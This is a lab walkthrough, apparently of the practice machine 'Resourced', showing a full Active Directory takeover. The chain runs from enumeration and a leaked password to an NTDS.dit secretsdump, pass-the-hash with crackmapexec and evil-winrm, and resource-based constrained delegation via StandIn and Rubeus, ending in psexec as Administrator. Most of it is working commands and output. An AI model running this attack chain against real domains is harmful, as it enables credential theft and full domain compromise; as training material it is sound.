# "Resourced" (Intermediate)

<figure><img src="../../../.gitbook/assets/image (1) (1) (9).png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-07 02:12:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-07T02:13:09+00:00
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Issuer: commonName=ResourceDC.resourced.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-24T13:12:44
| Not valid after:  2023-02-23T13:12:44
| MD5:   e7fb0471feafdac64ce3f400b076b070
|_SHA-1: 58912bf2fb9405ca82975c9e493a7c5d3399edf5
|_ssl-date: 2022-11-07T02:13:49+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-11-07T02:13:10
```

Enumerated UDP ports:

```
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
389/udp open  ldap
```

Notes:

* 53/DNS -- Added <mark style="color:yellow;">resourced.local to /etc/hosts</mark>
* 88 Kerberos
* SMB, LDAP, and RPC -- Enum4Linux
* 5985 -- Look for a chance to WinRM

## Enumeration

### Enum4Linux

<pre data-overflow="wrap"><code>enum4linux resourced.local

Domain Sid: S-1-5-21-537427935-490066102-1511301751

index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        
Name: (null)    
Desc: New-hired, reminder: HotelCalifornia194!

Users:
<strong>Administrator
</strong>Guest
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg
</code></pre>

* We see an interesting string in the description -- <mark style="color:yellow;">HotelCalifornia194!</mark>
* It sort of puzzled me at first with what I was supposed to do with these credentials but after passing them around the box with CME, I found out that we had valid SMB creds

### Port 445 - SMB

CrackMapExec:

```
crackmapexec smb resourced.local -u v.ventz -p 'HotelCalifornia194!'

SMB         resourced.local 445    RESOURCEDC       [*] Windows 10.0 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         resourced.local 445    RESOURCEDC       [+] resourced.local\v.ventz:HotelCalifornia194!
```

Impacket-SMBClient.py

```
python smbclient.py -dc-ip 192.168.81.175 'resourced.local/v.ventz:HotelCalifornia194!@192.168.81.175'

shares

use Password Audit

mget *
```

* <mark style="color:yellow;">We get a NTDS.dit file!!!</mark>
* Let's use secretsdump to dump some domain secrets

### Secrets Dump

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM -sam SAM LOCAL | tee secrets
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
[*] Cleaning up...
```

Output:

* Copy the Kerberos hashes only and place them into a file called hashes.txt

```
cat hashes.txt

Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
```

### Cracking with Hashcat

```
.\hashcat.exe -m 1000 hashes.txt .\rockyou.txt
```

* However, rockyou was unable to crack any hashes
* Let's see if we can pass the hash (PTH)!
* <mark style="color:yellow;">First, let's seperate the users and hashes into two separate files</mark>

<mark style="color:yellow;">users.txt</mark>:

```
cat secrets | cut -d":" -f1 | tee users.txt

cat users.txt 

Administrator
Guest
RESOURCEDC$
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg
```

<mark style="color:yellow;">hashes.txt</mark>:

```
cat secrets | cut -d":" -f4 | tee hashes.txt
```



## Exploitation

### Passing The Hash with CrackMapExec

{% code overflow="wrap" %}
```
crackmapexec winrm 192.168.81.175 -u users.txt -H hashes.txt

WINRM       192.168.81.175  5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```
{% endcode %}

* We get a pwn3d user!
* <mark style="color:yellow;">L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808</mark>

### Evil-WinRM

```
evil-winrm resourced.local -u l.livingston -H 19a3a7550ce8c505c2d46b5e39d6f808
```

<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Kerberos Resource-Based Constrained Delegation

* <mark style="color:yellow;">This exploit can occur when a user or group has GenericAll over an AD object</mark>
* <mark style="color:yellow;">Select your pwned user, Outbound Object Control -> Transitive Object Control</mark>

&#x20;<mark style="color:yellow;"></mark>&#x20;

<figure><img src="../../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption><p>User l.livingstone has GenericAll over an AD object</p></figcaption></figure>

Now to exploit this...

We need the following tools transferred over to the Windows target:

* <mark style="color:yellow;">Rubeus.exe</mark>
* <mark style="color:yellow;">StandIn.exe</mark>

### Create new user object

```
.\StandIn_v13_Net45.exe --computer hacker --make

[?] Using DC    : ResourceDC.resourced.local
    |_ Domain   : resourced.local
    |_ DN       : CN=hacker,CN=Computers,DC=resourced,DC=local
    |_ Password : A9uh6RaUNGIDoh8

[+] Machine account added to AD..
```

* Write down the generated password somewhere. Don't lose it.

### Grab SID

```
Get-ADComputer -Filter * | Select-Object Name, SID

Name       SID
----       ---
RESOURCEDC S-1-5-21-537427935-490066102-1511301751-1000
hacker     S-1-5-21-537427935-490066102-1511301751-4101
```

### Use Rubeus to create tickets and impersonate administrator



* To generate RC4, you can use Python:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```
python3

>>> import hashlib,binascii
>>> hash = hashlib.new('md4', "A9uh6RaUNGIDoh8".encode('utf-16le')).digest()
>>> print(binascii.hexlify(hash))
b'feaf50cd988e84293d190aac4d38f2ca'
```

* <mark style="color:yellow;">The output is where you will place the RC4 in Rubeus.</mark>

{% code overflow="wrap" %}
```
.\Rubeus.exe s4u /user:hacker /rc4:feaf50cd988e84293d190aac4d38f2ca /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /nowrap /ptt
  ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Building S4U2self request for: 'hacker@RESOURCED.LOCAL'
[*] Using domain controller: ResourceDC.resourced.local (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'hacker@RESOURCED.LOCAL'
[*] base64(ticket.kirbi):

      doIFkDCCBYygAwIBBaEDAgEWooIEqDCCBKRhggSgMIIEnKADAgEFoREbD1JFU09VUkNFRC5MT0NBTKITMBGgAwIBAaEKMAgbBmhhY2tlcqOCBGswggRnoAMCARehAwIBAaKCBFkEggRVfSla4pYMHP20rtVe6QRBM5T+4WCHuknvmM0jBgNVT9RHe4sn15Zq2Ccm2hkbItvA91iO9wcFOvVoYD7AHCrvMFqSCSjGmCfSPqvV8MrMshCYfhwLVHinOZcjxAr9MCVQEtQc7jtKeaTJxVmpy9J7rjjOHnXGB1YFgMHmGyA0ve8eJhOR7OmGvmHwCK5YxPmOo83Eqn4NgE1gn9y6DAJm5QHREqSqRmIjEXEAFvnuoI336a4yyZLNP5ulIZnyQGByPMcIDHOEj2TxWlGYNQK13etnbDJngopAJd2Zd89c+kYcnKENml16UF/LXQDdagDrbbS1R0xk03R7SEtteNuaJYibPk0bMFyoa7rFUWgbHD5L93vxNMtaNFXDkFpoujzSYvSc8xcS8fzJolX8tMkzK1BggvC7rtOTihKG3C24DZKU0lbiEy+rI6vyVLRwhBVn2X3pfumtNnOLYzP9xXleWNifYxvAnDkQLT0xOpfpqtUZu55ZCkTM2KYv+p98pMpizh5V6QMaaxHKqCb0+RrnzsLcIt0cESXAcVFX2I7Hzkn/tZdSYD9EXD4kETBSsZwknEpeLWYquTMMkCXjAkbg6PiVDusgECBKydC/nDFrWS+bQVjJZo8VlunJk2CsbKCO/g3lg4+47sAJu9tfW80q5oFXj80yuGSoWqQ51bKz+JcB9W7UvnB4KataDdqDXs2uj6t2yX0yX0JKzm7CWGeHiS9XAWvu6NzYHhRsD4Jno0uZW9kZkS6QeVkO8tpkAcEaIXqKwj8Z2PPc7AE+vwQniNV1QULEk1/stfOg0KuRxdGi1m+al4pzGmoqHkthfIQtnWQpundK1/8VOKD2QygsqlJS6QqRtAjdWs6uM2DcFVNbTqb3FjjQTh9Y4icOgEsagelAXFFNDiBGeo4j5i2MpHaADPtkITTBNkrcNu8PjO3Ljz5mJjdfN1QYDBDLk9lssIQK6eWRQhJZptNWCvN5OXH7BQRq+u33xa7eDtGjTKy4O2AwHrojQfhatMULwuzuW7UaD+n8uLngmIlphdIOetywbj1+kKzbISQFg/FEfOrIWGt7yGXfD0j3plyNuBBh3gsE5drgS53yXxJl9XhKJzdLCncX081WlNzAzmJbwAHKzr8vmQl/pcj+HWZFSvjSOKlY5Rq7q3sK3Hznxf86rPK9W8XERmAjMtD8jIjj4R0MxQmXCD+6iqxzuQXVustySdlcfCCv0MhDqGHumN/AL4LnMggadyZJW4HigLwolCXVsLXTKOhZIhF6ydffM/QP1u2esw+kyBu1bxw743ROUvvdeKACvMZOXsRvPb5o/11n853tkYNm4b0hoyvRLZ3fNFLCXdPCpJrssi3ofZtX9Og21cnokCoMfNQQ0cpSnUv9TG6aY0bqd45Y69K8PK9bjdfRSynDh2nwDqK8vYnNsj8gYmeXLvPul0YhSJqZcRw6kZHZXlQkStXwsFw1LCPoCXllZoWjgdMwgdCgAwIBAKKByASBxX2BwjCBv6CBvDCBuTCBtqAbMBmgAwIBF6ESBBA2sKwXx0ih0zF6QTk1B+CboREbD1JFU09VUkNFRC5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEChAAClERgPMjAyMjExMDkyMTA5NDZaphEYDzIwMjIxMTEwMDcwOTQ2WqcRGA8yMDIyMTExNjIxMDk0NlqoERsPUkVTT1VSQ0VELkxPQ0FMqRMwEaADAgEBoQowCBsGaGFja2Vy
```
{% endcode %}

<mark style="color:yellow;">Grab the Base64 encoded ticket and place it into a file called ticket.b64 on Kali:</mark>

```
nano ticket.b64

cat ticket.b64 | base64 -d > ticket.kirbi

python3 ticketConverter.py ticket.kirbi ticket.ccache
```

Run klist:

```
export KRB5CCNAME=ticket.ccache

klist

Ticket cache: FILE:ticket.ccache
Default principal: administrator@RESOURCED.LOCAL

Valid starting       Expires              Service principal
11/09/2022 16:09:46  11/10/2022 02:09:46  cifs/resourcedc.resourced.local@RESOURCED.LOCAL
        renew until 11/16/2022 16:09:46
```

Lastly, we can psexec into the target machine as the Administrator:

```
python3 psexec.py -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.81.175
```

<figure><img src="../../../.gitbook/assets/image (1) (8).png" alt=""><figcaption></figcaption></figure>
